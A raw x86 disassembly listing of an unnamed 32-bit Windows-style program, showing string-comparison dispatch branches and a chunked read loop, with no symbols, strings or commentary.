  40c27a:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c27d:	50                   	push   %eax
  40c27e:	e8 c8 2b 00 00       	call   0x40ee4b
  40c283:	59                   	pop    %ecx
  40c284:	59                   	pop    %ecx
  40c285:	8b c8                	mov    %eax,%ecx
  40c287:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c28d:	50                   	push   %eax
  40c28e:	ff 15 d0 00 41 00    	call   *0x4100d0
  40c294:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c297:	8b d8                	mov    %eax,%ebx
  40c299:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c29f:	f6 c3 10             	test   $0x10,%bl
  40c2a2:	6a 01                	push   $0x1
  40c2a4:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c2a7:	74 42                	je     0x40c2eb
  40c2a9:	e8 db 4f ff ff       	call   0x401289
  40c2ae:	50                   	push   %eax
  40c2af:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c2b2:	50                   	push   %eax
  40c2b3:	e8 93 2b 00 00       	call   0x40ee4b
  40c2b8:	50                   	push   %eax
  40c2b9:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c2bc:	50                   	push   %eax
  40c2bd:	e8 b1 2a 00 00       	call   0x40ed73
  40c2c2:	83 c4 10             	add    $0x10,%esp
  40c2c5:	8b c8                	mov    %eax,%ecx
  40c2c7:	ff 15 58 02 41 00    	call   *0x410258
  40c2cd:	50                   	push   %eax
  40c2ce:	e8 61 2f 00 00       	call   0x40f234
  40c2d3:	59                   	pop    %ecx
  40c2d4:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c2d7:	ff 15 54 02 41 00    	call   *0x410254
  40c2dd:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40c2e0:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c2e6:	e9 35 03 00 00       	jmp    0x40c620
  40c2eb:	e8 99 4f ff ff       	call   0x401289
  40c2f0:	50                   	push   %eax
  40c2f1:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c2f4:	50                   	push   %eax
  40c2f5:	e8 51 2b 00 00       	call   0x40ee4b
  40c2fa:	59                   	pop    %ecx
  40c2fb:	59                   	pop    %ecx
  40c2fc:	8b c8                	mov    %eax,%ecx
  40c2fe:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c304:	50                   	push   %eax
  40c305:	ff 15 94 01 41 00    	call   *0x410194
  40c30b:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c30e:	eb d0                	jmp    0x40c2e0
  40c310:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c313:	68 a4 16 41 00       	push   $0x4116a4
  40c318:	50                   	push   %eax
  40c319:	ff d6                	call   *%esi
  40c31b:	59                   	pop    %ecx
  40c31c:	84 c0                	test   %al,%al
  40c31e:	59                   	pop    %ecx
  40c31f:	0f 84 59 01 00 00    	je     0x40c47e
  40c325:	6a 02                	push   $0x2
  40c327:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c32a:	e8 5a 4f ff ff       	call   0x401289
  40c32f:	50                   	push   %eax
  40c330:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40c333:	50                   	push   %eax
  40c334:	e8 12 2b 00 00       	call   0x40ee4b
  40c339:	59                   	pop    %ecx
  40c33a:	59                   	pop    %ecx
  40c33b:	6a 03                	push   $0x3
  40c33d:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c340:	e8 44 4f ff ff       	call   0x401289
  40c345:	50                   	push   %eax
  40c346:	8d 45 88             	lea    -0x78(%ebp),%eax
  40c349:	50                   	push   %eax
  40c34a:	e8 fc 2a 00 00       	call   0x40ee4b
  40c34f:	a1 d4 01 41 00       	mov    0x4101d4,%eax
  40c354:	59                   	pop    %ecx
  40c355:	59                   	pop    %ecx
  40c356:	ff 30                	push   (%eax)
  40c358:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c35b:	6a 5c                	push   $0x5c
  40c35d:	ff 15 d0 01 41 00    	call   *0x4101d0
  40c363:	40                   	inc    %eax
  40c364:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c367:	50                   	push   %eax
  40c368:	8d 45 98             	lea    -0x68(%ebp),%eax
  40c36b:	57                   	push   %edi
  40c36c:	50                   	push   %eax
  40c36d:	ff 15 cc 01 41 00    	call   *0x4101cc
  40c373:	8d 45 88             	lea    -0x78(%ebp),%eax
  40c376:	50                   	push   %eax
  40c377:	8d 45 98             	lea    -0x68(%ebp),%eax
  40c37a:	50                   	push   %eax
  40c37b:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c37e:	50                   	push   %eax
  40c37f:	e8 b4 38 00 00       	call   0x40fc38
  40c384:	83 c4 0c             	add    $0xc,%esp
  40c387:	8b c8                	mov    %eax,%ecx
  40c389:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c38f:	50                   	push   %eax
  40c390:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c393:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c399:	50                   	push   %eax
  40c39a:	ff 15 08 03 41 00    	call   *0x410308
  40c3a0:	8b d8                	mov    %eax,%ebx
  40c3a2:	59                   	pop    %ecx
  40c3a3:	f7 db                	neg    %ebx
  40c3a5:	59                   	pop    %ecx
  40c3a6:	1a db                	sbb    %bl,%bl
  40c3a8:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c3ab:	fe c3                	inc    %bl
  40c3ad:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c3b3:	84 db                	test   %bl,%bl
  40c3b5:	74 37                	je     0x40c3ee
  40c3b7:	83 ec 10             	sub    $0x10,%esp
  40c3ba:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40c3bd:	8b c4                	mov    %esp,%eax
  40c3bf:	68 bc 07 41 00       	push   $0x4107bc
  40c3c4:	51                   	push   %ecx
  40c3c5:	50                   	push   %eax
  40c3c6:	e8 73 38 00 00       	call   0x40fc3e
  40c3cb:	83 c4 0c             	add    $0xc,%esp
  40c3ce:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c3d1:	6a 01                	push   $0x1
  40c3d3:	e8 b1 4e ff ff       	call   0x401289
  40c3d8:	83 ec 10             	sub    $0x10,%esp
  40c3db:	8b cc                	mov    %esp,%ecx
  40c3dd:	50                   	push   %eax
  40c3de:	ff 15 60 02 41 00    	call   *0x410260
  40c3e4:	e8 b2 f8 ff ff       	call   0x40bc9b
  40c3e9:	83 c4 20             	add    $0x20,%esp
  40c3ec:	eb 76                	jmp    0x40c464
  40c3ee:	83 ec 10             	sub    $0x10,%esp
  40c3f1:	be 68 52 41 00       	mov    $0x415268,%esi
  40c3f6:	8b fc                	mov    %esp,%edi
  40c3f8:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
  40c3fe:	68 a0 16 41 00       	push   $0x4116a0
  40c403:	56                   	push   %esi
  40c404:	68 88 16 41 00       	push   $0x411688
  40c409:	56                   	push   %esi
  40c40a:	68 80 16 41 00       	push   $0x411680
  40c40f:	50                   	push   %eax
  40c410:	e8 05 38 00 00       	call   0x40fc1a
  40c415:	83 c4 0c             	add    $0xc,%esp
  40c418:	50                   	push   %eax
  40c419:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c41c:	50                   	push   %eax
  40c41d:	e8 fe 37 00 00       	call   0x40fc20
  40c422:	83 c4 0c             	add    $0xc,%esp
  40c425:	50                   	push   %eax
  40c426:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c429:	50                   	push   %eax
  40c42a:	e8 e5 37 00 00       	call   0x40fc14
  40c42f:	83 c4 0c             	add    $0xc,%esp
  40c432:	50                   	push   %eax
  40c433:	57                   	push   %edi
  40c434:	e8 e7 37 00 00       	call   0x40fc20
  40c439:	83 c4 0c             	add    $0xc,%esp
  40c43c:	b9 30 5a 41 00       	mov    $0x415a30,%ecx
  40c441:	e8 52 5d ff ff       	call   0x402198
  40c446:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c449:	ff 15 54 02 41 00    	call   *0x410254
  40c44f:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40c452:	ff 15 54 02 41 00    	call   *0x410254
  40c458:	8d 8d 78 ff ff ff    	lea    -0x88(%ebp),%ecx
  40c45e:	ff 15 54 02 41 00    	call   *0x410254
  40c464:	8d 4d 98             	lea    -0x68(%ebp),%ecx
  40c467:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c46d:	8d 4d 88             	lea    -0x78(%ebp),%ecx
  40c470:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c476:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c479:	e9 62 fe ff ff       	jmp    0x40c2e0
  40c47e:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c481:	68 74 16 41 00       	push   $0x411674
  40c486:	50                   	push   %eax
  40c487:	ff d6                	call   *%esi
  40c489:	59                   	pop    %ecx
  40c48a:	84 c0                	test   %al,%al
  40c48c:	59                   	pop    %ecx
  40c48d:	0f 84 9d 00 00 00    	je     0x40c530
  40c493:	6a 02                	push   $0x2
  40c495:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c498:	e8 ec 4d ff ff       	call   0x401289
  40c49d:	50                   	push   %eax
  40c49e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40c4a1:	50                   	push   %eax
  40c4a2:	e8 a4 29 00 00       	call   0x40ee4b
  40c4a7:	59                   	pop    %ecx
  40c4a8:	59                   	pop    %ecx
  40c4a9:	57                   	push   %edi
  40c4aa:	6a 03                	push   $0x3
  40c4ac:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c4af:	e8 d5 4d ff ff       	call   0x401289
  40c4b4:	50                   	push   %eax
  40c4b5:	8d 45 a8             	lea    -0x58(%ebp),%eax
  40c4b8:	50                   	push   %eax
  40c4b9:	e8 8d 29 00 00       	call   0x40ee4b
  40c4be:	50                   	push   %eax
  40c4bf:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40c4c2:	50                   	push   %eax
  40c4c3:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40c4c6:	50                   	push   %eax
  40c4c7:	e8 6c 37 00 00       	call   0x40fc38
  40c4cc:	83 c4 14             	add    $0x14,%esp
  40c4cf:	8b c8                	mov    %eax,%ecx
  40c4d1:	ff 15 c4 02 41 00    	call   *0x4102c4
  40c4d7:	50                   	push   %eax
  40c4d8:	ff 15 c8 00 41 00    	call   *0x4100c8
  40c4de:	8d 4d cc             	lea    -0x34(%ebp),%ecx
  40c4e1:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c4e7:	8d 4d a8             	lea    -0x58(%ebp),%ecx
  40c4ea:	ff 15 c0 02 41 00    	call   *0x4102c0
  40c4f0:	6a 2a                	push   $0x2a
  40c4f2:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c4f5:	ff 15 c8 01 41 00    	call   *0x4101c8
  40c4fb:	83 ec 10             	sub    $0x10,%esp
  40c4fe:	8d 45 dc             	lea    -0x24(%ebp),%eax
  40c501:	8b cc                	mov    %esp,%ecx
  40c503:	50                   	push   %eax
  40c504:	ff 15 b4 02 41 00    	call   *0x4102b4
  40c50a:	6a 01                	push   $0x1
  40c50c:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c50f:	e8 75 4d ff ff       	call   0x401289
  40c514:	83 ec 10             	sub    $0x10,%esp
  40c517:	8b cc                	mov    %esp,%ecx
  40c519:	50                   	push   %eax
  40c51a:	ff 15 60 02 41 00    	call   *0x410260
  40c520:	e8 76 f7 ff ff       	call   0x40bc9b
  40c525:	83 c4 20             	add    $0x20,%esp
  40c528:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40c52b:	e9 b0 fd ff ff       	jmp    0x40c2e0
  40c530:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c533:	68 6c 16 41 00       	push   $0x41166c
  40c538:	50                   	push   %eax
  40c539:	ff d6                	call   *%esi
  40c53b:	59                   	pop    %ecx
  40c53c:	84 c0                	test   %al,%al
  40c53e:	59                   	pop    %ecx
  40c53f:	0f 84 a9 00 00 00    	je     0x40c5ee
  40c545:	6a 03                	push   $0x3
  40c547:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c54a:	e8 3a 4d ff ff       	call   0x401289
  40c54f:	8b c8                	mov    %eax,%ecx
  40c551:	ff 15 58 02 41 00    	call   *0x410258
  40c557:	50                   	push   %eax
  40c558:	ff 15 9c 03 41 00    	call   *0x41039c
  40c55e:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40c561:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40c564:	89 45 e8             	mov    %eax,-0x18(%ebp)
  40c567:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c56a:	50                   	push   %eax
  40c56b:	e8 9c 27 00 00       	call   0x40ed0c
  40c570:	59                   	pop    %ecx
  40c571:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40c574:	59                   	pop    %ecx
  40c575:	50                   	push   %eax
  40c576:	b9 98 56 41 00       	mov    $0x415698,%ecx
  40c57b:	e8 1d 09 00 00       	call   0x40ce9d
  40c580:	6a 04                	push   $0x4
  40c582:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c585:	e8 ff 4c ff ff       	call   0x401289
  40c58a:	83 ec 10             	sub    $0x10,%esp
  40c58d:	8b cc                	mov    %esp,%ecx
  40c58f:	50                   	push   %eax
  40c590:	ff 15 60 02 41 00    	call   *0x410260
  40c596:	6a 03                	push   $0x3
  40c598:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c59b:	e8 e9 4c ff ff       	call   0x401289
  40c5a0:	83 ec 10             	sub    $0x10,%esp
  40c5a3:	8b cc                	mov    %esp,%ecx
  40c5a5:	50                   	push   %eax
  40c5a6:	ff 15 60 02 41 00    	call   *0x410260
  40c5ac:	6a 02                	push   $0x2
  40c5ae:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c5b1:	e8 d3 4c ff ff       	call   0x401289
  40c5b6:	83 ec 10             	sub    $0x10,%esp
  40c5b9:	8b cc                	mov    %esp,%ecx
  40c5bb:	50                   	push   %eax
  40c5bc:	51                   	push   %ecx
  40c5bd:	e8 89 28 00 00       	call   0x40ee4b
  40c5c2:	59                   	pop    %ecx
  40c5c3:	59                   	pop    %ecx
  40c5c4:	6a 01                	push   $0x1
  40c5c6:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c5c9:	e8 bb 4c ff ff       	call   0x401289
  40c5ce:	83 ec 10             	sub    $0x10,%esp
  40c5d1:	8b cc                	mov    %esp,%ecx
  40c5d3:	50                   	push   %eax
  40c5d4:	51                   	push   %ecx
  40c5d5:	e8 71 28 00 00       	call   0x40ee4b
  40c5da:	59                   	pop    %ecx
  40c5db:	59                   	pop    %ecx
  40c5dc:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40c5df:	e8 61 66 ff ff       	call   0x402c45
  40c5e4:	8d 4d b8             	lea    -0x48(%ebp),%ecx
  40c5e7:	e8 27 39 00 00       	call   0x40ff13
  40c5ec:	eb 32                	jmp    0x40c620
  40c5ee:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c5f1:	68 60 16 41 00       	push   $0x411660
  40c5f6:	50                   	push   %eax
  40c5f7:	ff d6                	call   *%esi
  40c5f9:	59                   	pop    %ecx
  40c5fa:	84 c0                	test   %al,%al
  40c5fc:	59                   	pop    %ecx
  40c5fd:	74 21                	je     0x40c620
  40c5ff:	6a 01                	push   $0x1
  40c601:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c604:	e8 80 4c ff ff       	call   0x401289
  40c609:	8b c8                	mov    %eax,%ecx
  40c60b:	ff 15 58 02 41 00    	call   *0x410258
  40c611:	50                   	push   %eax
  40c612:	ff 15 9c 03 41 00    	call   *0x41039c
  40c618:	50                   	push   %eax
  40c619:	e8 56 6e ff ff       	call   0x403474
  40c61e:	59                   	pop    %ecx
  40c61f:	59                   	pop    %ecx
  40c620:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40c623:	ff 15 54 02 41 00    	call   *0x410254
  40c629:	8d 4d ec             	lea    -0x14(%ebp),%ecx
  40c62c:	e8 0b 55 ff ff       	call   0x401b3c
  40c631:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40c634:	ff 15 54 02 41 00    	call   *0x410254
  40c63a:	5f                   	pop    %edi
  40c63b:	5e                   	pop    %esi
  40c63c:	5b                   	pop    %ebx
  40c63d:	c9                   	leave
  40c63e:	c3                   	ret
  40c63f:	55                   	push   %ebp
  40c640:	8b ec                	mov    %esp,%ebp
  40c642:	81 ec 8c 04 00 00    	sub    $0x48c,%esp
  40c648:	53                   	push   %ebx
  40c649:	56                   	push   %esi
  40c64a:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40c64d:	57                   	push   %edi
  40c64e:	50                   	push   %eax
  40c64f:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40c652:	ff 15 50 02 41 00    	call   *0x410250
  40c658:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  40c65e:	e8 a0 62 ff ff       	call   0x402903
  40c663:	68 68 06 41 00       	push   $0x410668
  40c668:	68 58 52 41 00       	push   $0x415258
  40c66d:	c7 45 f4 88 13 00 00 	movl   $0x1388,-0xc(%ebp)
  40c674:	ff 15 a4 02 41 00    	call   *0x4102a4
  40c67a:	59                   	pop    %ecx
  40c67b:	84 c0                	test   %al,%al
  40c67d:	59                   	pop    %ecx
  40c67e:	74 22                	je     0x40c6a2
  40c680:	be 58 52 41 00       	mov    $0x415258,%esi
  40c685:	8b ce                	mov    %esi,%ecx
  40c687:	ff 15 a0 02 41 00    	call   *0x4102a0
  40c68d:	50                   	push   %eax
  40c68e:	8b ce                	mov    %esi,%ecx
  40c690:	ff 15 58 02 41 00    	call   *0x410258
  40c696:	50                   	push   %eax
  40c697:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  40c69d:	e8 64 62 ff ff       	call   0x402906
  40c6a2:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40c6a5:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c6a8:	50                   	push   %eax
  40c6a9:	33 db                	xor    %ebx,%ebx
  40c6ab:	33 ff                	xor    %edi,%edi
  40c6ad:	ff 15 50 02 41 00    	call   *0x410250
  40c6b3:	8d 45 ff             	lea    -0x1(%ebp),%eax
  40c6b6:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c6b9:	50                   	push   %eax
  40c6ba:	ff 15 50 02 41 00    	call   *0x410250
  40c6c0:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  40c6c3:	ff 75 f4             	push   -0xc(%ebp)
  40c6c6:	57                   	push   %edi
  40c6c7:	ff 15 58 03 41 00    	call   *0x410358
  40c6cd:	59                   	pop    %ecx
  40c6ce:	8b f8                	mov    %eax,%edi
  40c6d0:	59                   	pop    %ecx
  40c6d1:	6a 00                	push   $0x0
  40c6d3:	ff 75 f4             	push   -0xc(%ebp)
  40c6d6:	57                   	push   %edi
  40c6d7:	ff 75 08             	push   0x8(%ebp)
  40c6da:	e8 5f 38 00 00       	call   0x40ff3e
  40c6df:	8b f0                	mov    %eax,%esi
  40c6e1:	85 f6                	test   %esi,%esi
  40c6e3:	0f 8e 39 01 00 00    	jle    0x40c822
  40c6e9:	8d 45 f3             	lea    -0xd(%ebp),%eax
  40c6ec:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40c6ef:	50                   	push   %eax
  40c6f0:	56                   	push   %esi
  40c6f1:	57                   	push   %edi
  40c6f2:	ff 15 70 02 41 00    	call   *0x410270
  40c6f8:	50                   	push   %eax
  40c6f9:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c6fc:	ff 15 64 02 41 00    	call   *0x410264
  40c702:	8d 4d 80             	lea    -0x80(%ebp),%ecx
  40c705:	ff 15 54 02 41 00    	call   *0x410254
  40c70b:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40c70e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c711:	50                   	push   %eax
  40c712:	ff 15 94 02 41 00    	call   *0x410294
  40c718:	03 de                	add    %esi,%ebx
  40c71a:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40c71e:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  40c721:	0f 85 9c 00 00 00    	jne    0x40c7c3
  40c727:	68 68 06 41 00       	push   $0x410668
  40c72c:	68 58 52 41 00       	push   $0x415258
  40c731:	ff 15 a4 02 41 00    	call   *0x4102a4
  40c737:	59                   	pop    %ecx
  40c738:	84 c0                	test   %al,%al
  40c73a:	59                   	pop    %ecx
  40c73b:	74 36                	je     0x40c773
  40c73d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c740:	ff 15 90 02 41 00    	call   *0x410290
  40c746:	50                   	push   %eax
  40c747:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c74a:	ff 15 34 02 41 00    	call   *0x410234
  40c750:	50                   	push   %eax
  40c751:	8d 45 90             	lea    -0x70(%ebp),%eax
  40c754:	50                   	push   %eax
  40c755:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  40c75b:	e8 ca 62 ff ff       	call   0x402a2a
  40c760:	50                   	push   %eax
  40c761:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c764:	ff 15 64 02 41 00    	call   *0x410264
  40c76a:	8d 4d 90             	lea    -0x70(%ebp),%ecx
  40c76d:	ff 15 54 02 41 00    	call   *0x410254
  40c773:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40c776:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c779:	50                   	push   %eax
  40c77a:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40c77d:	50                   	push   %eax
  40c77e:	ff 15 58 02 41 00    	call   *0x410258
  40c784:	50                   	push   %eax
  40c785:	e8 2a 5d ff ff       	call   0x4024b4
  40c78a:	83 c4 0c             	add    $0xc,%esp
  40c78d:	84 c0                	test   %al,%al
  40c78f:	0f 84 8d 00 00 00    	je     0x40c822
  40c795:	b9 58 52 41 00       	mov    $0x415258,%ecx
  40c79a:	ff 15 a8 02 41 00    	call   *0x4102a8
  40c7a0:	84 c0                	test   %al,%al
  40c7a2:	75 1f                	jne    0x40c7c3
  40c7a4:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40c7a7:	3b 45 f4             	cmp    -0xc(%ebp),%eax
  40c7aa:	73 13                	jae    0x40c7bf
  40c7ac:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40c7af:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c7b2:	50                   	push   %eax
  40c7b3:	ff 15 64 02 41 00    	call   *0x410264
  40c7b9:	80 65 ff 00          	andb   $0x0,-0x1(%ebp)
  40c7bd:	eb 04                	jmp    0x40c7c3
  40c7bf:	c6 45 ff 01          	movb   $0x1,-0x1(%ebp)
  40c7c3:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40c7c6:	6a 0a                	push   $0xa
  40c7c8:	83 c3 f1             	add    $0xfffffff1,%ebx
  40c7cb:	50                   	push   %eax
  40c7cc:	53                   	push   %ebx
  40c7cd:	ff 15 5c 03 41 00    	call   *0x41035c
  40c7d3:	83 c4 0c             	add    $0xc,%esp
  40c7d6:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40c7d9:	ff 75 08             	push   0x8(%ebp)
  40c7dc:	83 ec 10             	sub    $0x10,%esp
  40c7df:	8b dc                	mov    %esp,%ebx
  40c7e1:	50                   	push   %eax
  40c7e2:	68 68 52 41 00       	push   $0x415268
  40c7e7:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c7ea:	68 0c 17 41 00       	push   $0x41170c
  40c7ef:	50                   	push   %eax
  40c7f0:	e8 25 34 00 00       	call   0x40fc1a
  40c7f5:	83 c4 0c             	add    $0xc,%esp
  40c7f8:	50                   	push   %eax
  40c7f9:	53                   	push   %ebx
  40c7fa:	e8 21 34 00 00       	call   0x40fc20
  40c7ff:	83 c4 0c             	add    $0xc,%esp
  40c802:	e8 fd 5c ff ff       	call   0x402504
  40c807:	83 c4 14             	add    $0x14,%esp
  40c80a:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40c80d:	ff 15 54 02 41 00    	call   *0x410254
  40c813:	8b 5d cc             	mov    -0x34(%ebp),%ebx
  40c816:	8d 43 f1             	lea    -0xf(%ebx),%eax
  40c819:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  40c81c:	0f 82 a1 fe ff ff    	jb     0x40c6c3
  40c822:	57                   	push   %edi
  40c823:	ff 15 80 03 41 00    	call   *0x410380
  40c829:	85 f6                	test   %esi,%esi
  40c82b:	59                   	pop    %ecx
  40c82c:	7f 22                	jg     0x40c850
  40c82e:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c831:	ff 15 54 02 41 00    	call   *0x410254
  40c837:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c83a:	ff 15 54 02 41 00    	call   *0x410254
  40c840:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40c843:	ff 15 54 02 41 00    	call   *0x410254
  40c849:	32 c0                	xor    %al,%al
  40c84b:	5f                   	pop    %edi
  40c84c:	5e                   	pop    %esi
  40c84d:	5b                   	pop    %ebx
  40c84e:	c9                   	leave
  40c84f:	c3                   	ret
  40c850:	b9 58 52 41 00       	mov    $0x415258,%ecx
  40c855:	ff 15 a8 02 41 00    	call   *0x4102a8
  40c85b:	84 c0                	test   %al,%al
  40c85d:	75 3c                	jne    0x40c89b
  40c85f:	80 7d ff 01          	cmpb   $0x1,-0x1(%ebp)
  40c863:	75 36                	jne    0x40c89b
  40c865:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c868:	ff 15 90 02 41 00    	call   *0x410290
  40c86e:	50                   	push   %eax
  40c86f:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c872:	ff 15 34 02 41 00    	call   *0x410234
  40c878:	50                   	push   %eax
  40c879:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c87c:	50                   	push   %eax
  40c87d:	8d 8d 74 fb ff ff    	lea    -0x48c(%ebp),%ecx
  40c883:	e8 a2 61 ff ff       	call   0x402a2a
  40c888:	50                   	push   %eax
  40c889:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c88c:	ff 15 64 02 41 00    	call   *0x410264
  40c892:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40c895:	ff 15 54 02 41 00    	call   *0x410254
  40c89b:	a1 9c 02 41 00       	mov    0x41029c,%eax
  40c8a0:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c8a3:	ff 30                	push   (%eax)
  40c8a5:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40c8a8:	6a 0f                	push   $0xf
  40c8aa:	50                   	push   %eax
  40c8ab:	ff 15 98 02 41 00    	call   *0x410298
  40c8b1:	50                   	push   %eax
  40c8b2:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c8b5:	ff 15 64 02 41 00    	call   *0x410264
  40c8bb:	8d 4d bc             	lea    -0x44(%ebp),%ecx
  40c8be:	ff 15 54 02 41 00    	call   *0x410254
  40c8c4:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40c8c7:	8d 45 e0             	lea    -0x20(%ebp),%eax
  40c8ca:	50                   	push   %eax
  40c8cb:	ff 15 64 02 41 00    	call   *0x410264
  40c8d1:	8d 4d e0             	lea    -0x20(%ebp),%ecx
  40c8d4:	ff 15 54 02 41 00    	call   *0x410254
  40c8da:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40c8dd:	ff 15 54 02 41 00    	call   *0x410254
  40c8e3:	8d 4d ac             	lea    -0x54(%ebp),%ecx
  40c8e6:	ff 15 54 02 41 00    	call   *0x410254
  40c8ec:	b0 01                	mov    $0x1,%al
  40c8ee:	e9 58 ff ff ff       	jmp    0x40c84b
  40c8f3:	55                   	push   %ebp
  40c8f4:	8b ec                	mov    %esp,%ebp
  40c8f6:	81 ec b4 02 00 00    	sub    $0x2b4,%esp
  40c8fc:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  40c902:	68 2c 01 00 00       	push   $0x12c
  40c907:	50                   	push   %eax
  40c908:	ff 75 08             	push   0x8(%ebp)
  40c90b:	ff 15 18 04 41 00    	call   *0x410418
  40c911:	ff 75 08             	push   0x8(%ebp)
  40c914:	ff 15 64 04 41 00    	call   *0x410464
  40c91a:	85 c0                	test   %eax,%eax
  40c91c:	0f 84 b4 00 00 00    	je     0x40c9d6
  40c922:	66 83 bd 4c fd ff ff 	cmpw   $0x0,-0x2b4(%ebp)
  40c929:	00 
  40c92a:	0f 84 a6 00 00 00    	je     0x40c9d6
  40c930:	ff 75 08             	push   0x8(%ebp)
  40c933:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40c936:	68 34 17 41 00       	push   $0x411734
  40c93b:	50                   	push   %eax
  40c93c:	ff 15 60 03 41 00    	call   *0x410360
  40c942:	83 c4 0c             	add    $0xc,%esp
  40c945:	8d 45 0b             	lea    0xb(%ebp),%eax
  40c948:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  40c94b:	50                   	push   %eax
  40c94c:	8d 85 4c fd ff ff    	lea    -0x2b4(%ebp),%eax
  40c952:	50                   	push   %eax
  40c953:	ff 15 bc 02 41 00    	call   *0x4102bc
  40c959:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40c95c:	68 28 17 41 00       	push   $0x411728
  40c961:	50                   	push   %eax
  40c962:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40c965:	68 1c 17 41 00       	push   $0x41171c
  40c96a:	50                   	push   %eax
